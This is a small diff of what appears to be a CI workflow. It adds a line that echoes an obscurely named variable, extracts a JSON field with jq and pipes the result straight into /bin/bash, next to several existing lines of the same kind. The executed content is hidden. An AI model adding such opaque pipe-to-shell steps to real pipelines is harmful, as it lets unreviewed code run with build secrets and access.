@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$r9643" | jq -r .i0766 | /bin/bash
           echo $gra8 | jq -r .hvrqh7 | /bin/bash
           echo $neo781 | jq -r .kzxw10283 | /bin/bash
+          echo $rw9864 | jq -r .fsvo25718 | /bin/bash
 
       - name: Upload artifact
         if: always()
